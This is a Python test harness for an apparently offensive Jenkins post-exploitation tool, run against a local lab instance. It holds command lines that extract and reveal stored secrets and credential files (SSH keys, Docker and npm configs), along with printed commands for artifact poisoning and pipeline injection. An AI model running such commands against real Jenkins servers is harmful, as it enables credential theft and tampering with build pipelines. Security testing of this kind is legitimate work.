#!/usr/bin/env python3
"""
Test script for JenkinsBreaker secrets extraction and post-exploitation features.
Tests against Jenkins Lab instance at http://localhost:8080
"""

import subprocess
import json
import os
import sys
from pathlib import Path

def run_command(cmd, description):
    """Run a command and print results."""
    print(f"\n{'='*80}")
    print(f"TEST: {description}")
    print(f"{'='*80}")
    print(f"Command: {cmd}")
    print("-" * 80)
    
    result = subprocess.run(
        cmd,
        shell=True,
        capture_output=True,
        text=True
    )
    
    print(result.stdout)
    if result.stderr:
        print("STDERR:", result.stderr)
    
    print(f"Exit Code: {result.returncode}")
    return result.returncode == 0, result.stdout, result.stderr

def test_secrets_extraction():
    """Test secrets extraction from Jenkins Lab."""
    
    jenkins_url = "http://localhost:8080"
    username = "admin"
    password = "admin"
    
    tests = [
        {
            "name": "Extract secrets from config files",
            "cmd": f'python JenkinsBreaker.py --url {jenkins_url} --username {username} --password {password} --extract-secrets',
            "expect": ["Extracting secrets from configuration files", "Extracted"]
        },
        {
            "name": "Extract secrets from config files (with reveal)",
            "cmd": f'python JenkinsBreaker.py --url {jenkins_url} --username {username} --password {password} --extract-secrets --reveal-secrets',
            "expect": ["Extracting secrets from configuration files", "Extracted"]
        },
        {
            "name": "Scan credential files",
            "cmd": f'python JenkinsBreaker.py --url {jenkins_url} --username {username} --password {password} --scan-credential-files --reveal-secrets',
            "expect": ["AKIAIOSFODNN7EXAMPLE", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "id_rsa", ".docker/config.json", ".npmrc"]
        },
        {
            "name": "Extract job secrets",
            "cmd": f'python JenkinsBreaker.py --url {jenkins_url} --username {username} --password {password} --extract-job-secrets',
            "expect": ["Extracting secrets from job configurations", "Extracted"]
        },
        {
            "name": "Export secrets to JSON (redacted)",
            "cmd": f'python JenkinsBreaker.py --url {jenkins_url} --username {username} --password {password} --extract-secrets --scan-credential-files --export-secrets secrets_test.json',
            "expect": ["Exported", "secrets_test.json"]
        },
        {
            "name": "Export secrets to JSON (revealed)",
            "cmd": f'python JenkinsBreaker.py --url {jenkins_url} --username {username} --password {password} --extract-secrets --scan-credential-files --reveal-secrets --export-secrets secrets_revealed_test.json',
            "expect": ["Exported", "secrets_revealed_test.json"]
        }
    ]
    
    results = []
    
    for test in tests:
        success, stdout, stderr = run_command(test["cmd"], test["name"])
        
        expected_found = []
        expected_missing = []
        
        for expected in test.get("expect", []):
            if expected.lower() in stdout.lower():
                expected_found.append(expected)
            else:
                expected_missing.append(expected)
        
        test_passed = success and len(expected_missing) == 0
        
        results.append({
            "name": test["name"],
            "passed": test_passed,
            "expected_found": expected_found,
            "expected_missing": expected_missing
        })
        
        print(f"\n{'='*80}")
        print(f"TEST RESULT: {'PASS' if test_passed else 'FAIL'}")
        if expected_found:
            print(f"Expected strings found: {', '.join(expected_found)}")
        if expected_missing:
            print(f"Expected strings MISSING: {', '.join(expected_missing)}")
        print(f"{'='*80}\n")
    
    return results

def validate_exported_json():
    """Validate the exported JSON files."""
    print(f"\n{'='*80}")
    print("VALIDATING EXPORTED JSON FILES")
    print(f"{'='*80}\n")
    
    json_files = ["secrets_test.json", "secrets_revealed_test.json"]
    
    for json_file in json_files:
        if os.path.exists(json_file):
            print(f"\nValidating {json_file}...")
            with open(json_file, 'r') as f:
                data = json.load(f)
            
            print(f"  Target: {data.get('target')}")
            print(f"  Timestamp: {data.get('timestamp')}")
            print(f"  Secrets count: {data.get('secrets_count')}")
            
            if data.get('secrets'):
                print(f"  First secret type: {data['secrets'][0].get('type')}")
                print(f"  First secret source: {data['secrets'][0].get('source')}")
                
                has_plaintext = 'value' in data['secrets'][0]
                print(f"  Contains plaintext values: {has_plaintext}")
            
            print(f"  Validation: PASS")
        else:
            print(f"  {json_file}: NOT FOUND")

def test_artifact_poisoning():
    """Test artifact poisoning (requires confirmation)."""
    print(f"\n{'='*80}")
    print("NOTE: Artifact poisoning test skipped (requires manual confirmation)")
    print("To test manually, run:")
    print("  python JenkinsBreaker.py --url http://localhost:8080 --username admin --password admin --poison-artifact test-job test-artifact 'malicious payload'")
    print(f"{'='*80}\n")

def test_pipeline_injection():
    """Test pipeline injection (requires confirmation)."""
    print(f"\n{'='*80}")
    print("NOTE: Pipeline injection test skipped (requires manual confirmation)")
    print("To test manually, run:")
    print("  python JenkinsBreaker.py --url http://localhost:8080 --username admin --password admin --inject-pipeline test-job 'node { sh \"whoami\" }'")
    print(f"{'='*80}\n")

def print_summary(results):
    """Print test summary."""
    print(f"\n{'='*80}")
    print("TEST SUMMARY")
    print(f"{'='*80}\n")
    
    total = len(results)
    passed = sum(1 for r in results if r["passed"])
    failed = total - passed
    
    print(f"Total tests: {total}")
    print(f"Passed: {passed}")
    print(f"Failed: {failed}")
    print(f"Success rate: {(passed/total*100):.1f}%\n")
    
    if failed > 0:
        print("Failed tests:")
        for r in results:
            if not r["passed"]:
                print(f"  - {r['name']}")
                if r["expected_missing"]:
                    print(f"    Missing: {', '.join(r['expected_missing'])}")
    
    print(f"\n{'='*80}\n")
    
    return failed == 0

if __name__ == "__main__":
    print("="*80)
    print("JENKINSBREAKER SECRETS EXTRACTION TEST SUITE")
    print("="*80)
    print("\nPrerequisites:")
    print("  - Jenkins Lab running at http://localhost:8080")
    print("  - Credentials: admin:admin")
    print("  - JenkinsBreaker.py in current directory")
    print("\nStarting tests...\n")
    
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    results = test_secrets_extraction()
    validate_exported_json()
    test_artifact_poisoning()
    test_pipeline_injection()
    
    all_passed = print_summary(results)
    
    if all_passed:
        print("[PASS] All tests passed!")
        sys.exit(0)
    else:
        print("[FAIL] Some tests failed")
        sys.exit(1)
